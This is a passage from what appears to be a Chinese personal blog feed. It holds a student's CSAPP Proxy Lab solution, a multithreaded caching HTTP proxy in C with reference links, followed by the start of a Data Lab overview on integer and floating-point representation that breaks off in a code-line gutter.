<span class="hljs-title">clientaddr</span>;</span><br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage :%s &lt;port&gt; \n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    signal(SIGPIPE, sigpipe_handler); <span class="hljs-comment">// 添加信号处理函数</span><br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br><br>    init_Cache();<br>    sbuf_init(&amp;sbuf, SBUFSIZE);<br>    <span class="hljs-comment">// 创建一批消费者线程  初始状态均为挂起</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NTHREADS; i++)<br>    &#123;<br>        Pthread_create(&amp;tid, <span class="hljs-literal">NULL</span>, thread, <span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);<br>        sbuf_insert(&amp;sbuf, connfd); <span class="hljs-comment">// 收到请求之后加入缓存池中,之后</span><br>        Getnameinfo((SA *)&amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s %s).\n&quot;</span>, hostname, port);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *vargp)</span><br>&#123;<br>    Pthread_detach(pthread_self()); <span class="hljs-comment">// 分离线程</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-type">int</span> connfd = sbuf_remove(&amp;sbuf); <span class="hljs-comment">// 如果缓冲区为空，则阻塞等待</span><br>        doit(connfd);<br>        <span class="hljs-comment">// 关闭客户端的连接描述符</span><br>        Close(connfd);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">doit</span><span class="hljs-params">(<span class="hljs-type">int</span> connfd)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];<br>    <span class="hljs-type">char</span> server[MAXLINE];<br>    <span class="hljs-type">rio_t</span> rio, server_rio;<br>    <span class="hljs-type">char</span> uri_copy[MAXLINE];<br><br>    Rio_readinitb(&amp;rio, connfd);<br>    Rio_readlineb(&amp;rio, buf, MAXLINE);<br>    <span class="hljs-built_in">sscanf</span>(buf, <span class="hljs-string">&quot;%s %s %s&quot;</span>, method, uri, version);<br>    <span class="hljs-built_in">strcpy</span>(uri_copy, uri); <span class="hljs-comment">// parse时会修改uri  因此一定要提前复制一份uri</span><br><br>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>))<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Proxy does not implement the method&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Uri</span> *<span class="hljs-title">uri_data</span> =</span> (<span class="hljs-keyword">struct</span> Uri *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Uri));<br>    <span class="hljs-comment">// 判断uri是否缓存，若缓存，直接回复</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">if</span> ((i = get_Cache(uri_copy)) != <span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-comment">// 加锁</span><br>        P(&amp;cache.data[i].mutex);<br>        cache.data[i].read_cnt++;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">1</span>)<br>            P(&amp;cache.data[i].w);<br>        V(&amp;cache.data[i].mutex);<br><br>        Rio_writen(connfd, cache.data[i].obj, <span class="hljs-built_in">strlen</span>(cache.data[i].obj));<br><br>        P(&amp;cache.data[i].mutex);<br>        cache.data[i].read_cnt--;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>)<br>            V(&amp;cache.data[i].w);<br>        V(&amp;cache.data[i].mutex);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 若缓存中没有，则向服务器发起请求</span><br>    <span class="hljs-comment">// 解析uri</span><br>    parse_uri(uri, uri_data);<br>    <span class="hljs-comment">// 设置header</span><br>    build_header(server, uri_data, &amp;rio);<br><br>    <span class="hljs-comment">// 连接服务器</span><br>    <span class="hljs-type">int</span> serverfd = Open_clientfd(uri_data-&gt;host, uri_data-&gt;port);<br>    <span class="hljs-keyword">if</span> (serverfd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connection failed\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 发送请求</span><br>    Rio_readinitb(&amp;server_rio, serverfd);<br>    Rio_writen(serverfd, server, <span class="hljs-built_in">strlen</span>(server));<br><br>    <span class="hljs-comment">// 转发服务器的响应 并视情况存入cache</span><br>    <span class="hljs-type">char</span> cache_buf[MAX_OBJECT_SIZE];<br>    <span class="hljs-type">int</span> size_buf = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">size_t</span> n;<br>    <span class="hljs-keyword">while</span> ((n = Rio_readlineb(&amp;server_rio, buf, MAXLINE)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-comment">// 注意判断是否会超出缓存大小</span><br>        size_buf += n;<br>        <span class="hljs-keyword">if</span> (size_buf &lt; MAX_OBJECT_SIZE)<br>            <span class="hljs-built_in">strcat</span>(cache_buf, buf);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;proxy received %d bytes,then send\n&quot;</span>, (<span class="hljs-type">int</span>)n);<br>        Rio_writen(connfd, buf, n);<br>    &#125;<br>    Close(serverfd); <span class="hljs-comment">// 关闭与服务器连接的描述符</span><br>    <span class="hljs-keyword">if</span> (size_buf &lt; MAX_OBJECT_SIZE)<br>    &#123;<br>        write_Cache(uri_copy, cache_buf);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build_header</span><span class="hljs-params">(<span class="hljs-type">char</span> *http_header, <span class="hljs-keyword">struct</span> Uri *uri_data, <span class="hljs-type">rio_t</span> *client_rio)</span><br>&#123;<br>    <span class="hljs-type">char</span> *User_Agent = <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n&quot;</span>;<br>    <span class="hljs-type">char</span> *conn_hdr = <span class="hljs-string">&quot;Connection: close\r\n&quot;</span>;<br>    <span class="hljs-type">char</span> *prox_hdr = <span class="hljs-string">&quot;Proxy-Connection: close\r\n&quot;</span>;<br>    <span class="hljs-type">char</span> *host_hdr_format = <span class="hljs-string">&quot;Host: %s\r\n&quot;</span>;<br>    <span class="hljs-type">char</span> *requestlint_hdr_format = <span class="hljs-string">&quot;GET %s HTTP/1.0\r\n&quot;</span>;<br>    <span class="hljs-type">char</span> *endof_hdr = <span class="hljs-string">&quot;\r\n&quot;</span>;<br><br>    <span class="hljs-type">char</span> buf[MAXLINE], request_hdr[MAXLINE], other_hdr[MAXLINE], host_hdr[MAXLINE];<br>    <span class="hljs-built_in">sprintf</span>(request_hdr, requestlint_hdr_format, uri_data-&gt;path);<br>    <span class="hljs-keyword">while</span> (Rio_readlineb(client_rio, buf, MAXLINE) &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">// 添加后续的请求报头</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, endof_hdr) == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">break</span>; <span class="hljs-comment">/*EOF*/</span><br><br>        <span class="hljs-keyword">if</span> (!strncasecmp(buf, <span class="hljs-string">&quot;Host&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Host&quot;</span>))) <span class="hljs-comment">/*Host:*/</span> <span class="hljs-comment">// 添加原来的host</span><br>        &#123;<br>            <span class="hljs-built_in">strcpy</span>(host_hdr, buf);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!strncasecmp(buf, <span class="hljs-string">&quot;Connection&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Connection&quot;</span>)) || !strncasecmp(buf, <span class="hljs-string">&quot;Proxy-Connection&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Proxy-Connection&quot;</span>)) || !strncasecmp(buf, <span class="hljs-string">&quot;User-Agent&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;User-Agent&quot;</span>)))<br>        &#123;<br>            <span class="hljs-built_in">strcat</span>(other_hdr, buf);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(host_hdr) == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">sprintf</span>(host_hdr, host_hdr_format, uri_data-&gt;host);<br>    &#125;<br>    <span class="hljs-built_in">sprintf</span>(http_header, <span class="hljs-string">&quot;%s%s%s%s%s%s%s&quot;</span>,<br>            request_hdr,<br>            host_hdr,<br>            conn_hdr,<br>            prox_hdr,<br>            User_Agent,<br>            other_hdr,<br>            endof_hdr); <span class="hljs-comment">// 组合起来</span><br><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// 解析uri</span><br><span class="hljs-comment">// eg: http://www.cmu.edu:8080/hub/index.html</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">parse_uri</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri, <span class="hljs-keyword">struct</span> Uri *uri_data)</span><br>&#123;<br>    <span class="hljs-type">char</span> *hostpose = <span class="hljs-built_in">strstr</span>(uri, <span class="hljs-string">&quot;//&quot;</span>); <span class="hljs-comment">//  定位hostname之前的//符号</span><br>    <span class="hljs-keyword">if</span> (hostpose == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-type">char</span> *pathpose = <span class="hljs-built_in">strstr</span>(uri, <span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">if</span> (pathpose != <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-built_in">strcpy</span>(uri_data-&gt;path, pathpose);<br>        <span class="hljs-built_in">strcpy</span>(uri_data-&gt;port, <span class="hljs-string">&quot;80&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-type">char</span> *portpose = <span class="hljs-built_in">strstr</span>(hostpose + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;:&quot;</span>);<br>        <span class="hljs-keyword">if</span> (portpose != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-type">int</span> tmp;<br>            <span class="hljs-built_in">sscanf</span>(portpose + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;%d%s&quot;</span>, &amp;tmp, uri_data-&gt;path);<br>            <span class="hljs-built_in">sprintf</span>(uri_data-&gt;port, <span class="hljs-string">&quot;%d&quot;</span>, tmp);<br>            *portpose = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-type">char</span> *pathpose = <span class="hljs-built_in">strstr</span>(hostpose + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;/&quot;</span>);<br>            <span class="hljs-keyword">if</span> (pathpose != <span class="hljs-literal">NULL</span>)<br>            &#123;<br>                <span class="hljs-built_in">strcpy</span>(uri_data-&gt;path, pathpose);<br>                <span class="hljs-built_in">strcpy</span>(uri_data-&gt;port, <span class="hljs-string">&quot;80&quot;</span>);<br>                *pathpose = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">strcpy</span>(uri_data-&gt;host, hostpose + <span class="hljs-number">2</span>); <span class="hljs-comment">// 要在添加完&#x27;\0&#x27;之后再copy</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sbuf_init</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp, <span class="hljs-type">int</span> n)</span><br>&#123;<br>    sp-&gt;buf = Calloc(n, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    sp-&gt;n = n;                  <span class="hljs-comment">/* Buffer holds max of n items */</span><br>    sp-&gt;front = sp-&gt;rear = <span class="hljs-number">0</span>;   <span class="hljs-comment">/* Empty buffer iff front == rear */</span><br>    Sem_init(&amp;sp-&gt;mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">/* Binary semaphore for locking */</span><br>    Sem_init(&amp;sp-&gt;slots, <span class="hljs-number">0</span>, n); <span class="hljs-comment">/* Initially, buf has n empty slots */</span><br>    Sem_init(&amp;sp-&gt;items, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">/* Initially, buf has zero data items */</span><br>&#125;<br><span class="hljs-comment">/* $end sbuf_init */</span><br><br><span class="hljs-comment">/* Clean up buffer sp */</span><br><span class="hljs-comment">/* $begin sbuf_deinit */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sbuf_deinit</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp)</span><br>&#123;<br>    Free(sp-&gt;buf);<br>&#125;<br><span class="hljs-comment">/* $end sbuf_deinit */</span><br><br><span class="hljs-comment">/* Insert item onto the rear of shared buffer sp */</span><br><span class="hljs-comment">/* $begin sbuf_insert */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sbuf_insert</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp, <span class="hljs-type">int</span> item)</span><br>&#123;<br>    P(&amp;sp-&gt;slots);                          <span class="hljs-comment">/* Wait for available slot */</span><br>    P(&amp;sp-&gt;mutex);                          <span class="hljs-comment">/* Lock the buffer */</span><br>    sp-&gt;buf[(++sp-&gt;rear) % (sp-&gt;n)] = item; <span class="hljs-comment">/* Insert the item */</span><br>    V(&amp;sp-&gt;mutex);                          <span class="hljs-comment">/* Unlock the buffer */</span><br>    V(&amp;sp-&gt;items);                          <span class="hljs-comment">/* Announce available item */</span><br>&#125;<br><span class="hljs-comment">/* $end sbuf_insert */</span><br><br><span class="hljs-comment">/* Remove and return the first item from buffer sp */</span><br><span class="hljs-comment">/* $begin sbuf_remove */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sbuf_remove</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp)</span><br>&#123;<br>    <span class="hljs-type">int</span> item;<br>    P(&amp;sp-&gt;items);                           <span class="hljs-comment">/* Wait for available item */</span><br>    P(&amp;sp-&gt;mutex);                           <span class="hljs-comment">/* Lock the buffer */</span><br>    item = sp-&gt;buf[(++sp-&gt;front) % (sp-&gt;n)]; <span class="hljs-comment">/* Remove the item */</span><br>    V(&amp;sp-&gt;mutex);                           <span class="hljs-comment">/* Unlock the buffer */</span><br>    V(&amp;sp-&gt;slots);                           <span class="hljs-comment">/* Announce available slot */</span><br>    <span class="hljs-keyword">return</span> item;<br>&#125;<br><span class="hljs-comment">/* $end sbuf_remove */</span><br><span class="hljs-comment">/* $end sbufc */</span><br><br><span class="hljs-comment">// 初始化Cache</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_Cache</span><span class="hljs-params">()</span><br>&#123;<br>    cache.num = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE; i++)<br>    &#123;<br>        cache.data[i].LRU = <span class="hljs-number">0</span>;<br>        cache.data[i].isEmpty = <span class="hljs-number">1</span>;<br>        <span class="hljs-comment">// w, mutex均初始化为1</span><br>        Sem_init(&amp;cache.data[i].w, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>        Sem_init(&amp;cache.data[i].mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>        cache.data[i].read_cnt = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 从Cache中找到内容</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_Cache</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE; i++)<br>    &#123;<br>        <span class="hljs-comment">// 读者加锁</span><br>        P(&amp;cache.data[i].mutex);<br>        cache.data[i].read_cnt++;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">1</span>)<br>            P(&amp;cache.data[i].w); <span class="hljs-comment">// 第一次有读者访问时，把写者禁了，不允许写</span><br>        V(&amp;cache.data[i].mutex); <span class="hljs-comment">// 修改read_cnt之后允许其他写者访问</span><br><br>        <span class="hljs-keyword">if</span> ((cache.data[i].isEmpty == <span class="hljs-number">0</span>) &amp;&amp; (<span class="hljs-built_in">strcmp</span>(uri, cache.data[i].uri) == <span class="hljs-number">0</span>)) <span class="hljs-comment">// 找到了目标uri</span><br>        &#123;<br>            update_LRU(i); <span class="hljs-comment">// 更新LRU</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        P(&amp;cache.data[i].mutex); <span class="hljs-comment">// 操作完之后read_cnt--，读者加锁</span><br>        cache.data[i].read_cnt--;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>)<br>            V(&amp;cache.data[i].w); <span class="hljs-comment">// 最后的读者离开后，允许写者访问</span><br>        V(&amp;cache.data[i].mutex);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (i &gt;= MAX_CACHE)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><br><span class="hljs-comment">// 找到可以存放的缓存行</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_Index</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> min = __INT_MAX__;<br>    <span class="hljs-type">int</span> find_index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE; i++)<br>    &#123;<br>        <span class="hljs-comment">// 读锁</span><br>        P(&amp;cache.data[i].mutex);<br>        cache.data[i].read_cnt++;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">1</span>)<br>            P(&amp;cache.data[i].w);<br>        V(&amp;cache.data[i].mutex);<br><br>        <span class="hljs-comment">// 找到一个空block</span><br>        <span class="hljs-keyword">if</span> (cache.data[i].isEmpty == <span class="hljs-number">1</span>)<br>        &#123;<br>            find_index = i;<br>            P(&amp;cache.data[i].mutex);<br>            cache.data[i].read_cnt--;<br>            <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>)<br>                V(&amp;cache.data[i].w);<br>            V(&amp;cache.data[i].mutex);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// 记录最小的LRU的索引，也就是要替换的block</span><br>        <span class="hljs-keyword">if</span> (cache.data[i].LRU &lt; min)<br>        &#123;<br>            find_index = i;<br>            min = cache.data[i].LRU;<br>            P(&amp;cache.data[i].mutex);<br>            cache.data[i].read_cnt--;<br>            <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>)<br>                V(&amp;cache.data[i].w);<br>            V(&amp;cache.data[i].mutex);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        P(&amp;cache.data[i].mutex);<br>        cache.data[i].read_cnt--;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>)<br>            V(&amp;cache.data[i].w);<br>        V(&amp;cache.data[i].mutex);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> find_index;<br>&#125;<br><span class="hljs-comment">// 更新LRU</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">update_LRU</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE; i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (cache.data[i].isEmpty == <span class="hljs-number">0</span> &amp;&amp; i != index)<br>        &#123;<br>            P(&amp;cache.data[i].w);<br>            cache.data[i].LRU--;<br>            V(&amp;cache.data[i].w);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 写缓存</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_Cache</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br><br>    <span class="hljs-type">int</span> i = get_Index();<br>    <span class="hljs-comment">// 加写锁</span><br>    P(&amp;cache.data[i].w);<br>    <span class="hljs-comment">// 写入内容</span><br>    <span class="hljs-built_in">strcpy</span>(cache.data[i].obj, buf);<br>    <span class="hljs-built_in">strcpy</span>(cache.data[i].uri, uri);<br>    cache.data[i].isEmpty = <span class="hljs-number">0</span>;<br>    cache.data[i].LRU = __INT_MAX__;<br>    update_LRU(i);<br><br>    V(&amp;cache.data[i].w);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/497982541">CSAPP | Lab9-Proxy Lab 深入解析 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/680187157">更适合北大宝宝体质的 Proxy Lab 踩坑记 - 知乎 (zhihu.com)</a></p><p><a href="https://github.com/jlu-xiurui/csapp-labs">jlu-xiurui&#x2F;csapp-labs: 《深入理解计算机系统》-CSAPP的实验笔记、源码、答案（8个实验均已完结） (github.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/project/2025/05/24/csapp/1,data_lab/"/>
    <url>/project/2025/05/24/csapp/1,data_lab/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul><li><p>对应第二章 信息的表示和处理</p></li><li><p>这一章主要是整数、浮点数的表示和运算 </p></li><li><p>重点是理解补码的表示，补码的加法（理解正负溢出），利用取反~计算相反数，用补码做减法运算  $ 5-3&#x3D;5+(-3)$ </p></li><li><p>算数移位和逻辑移位的区别（无符号数为逻辑移位，有符号数是算术移位，右移时左端填充符号位）</p></li><li><p>对整型做逻辑运算！        !0x41&#x3D;0x00</p></li><li><p>整型的除法是舍弃结果的小数位，正数向下取整 ，负数向上取整 （如何实现）</p></li><li><p>利用移位及加减运算实现乘除法</p></li><li><p>不使用减法 实现整数的大小比较</p></li><li><p>浮点数的表示</p></li></ul><h2 id="答案代码"><a href="#答案代码" class="headerlink" title="答案代码"></a>答案代码</h2><p>修改tests.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span 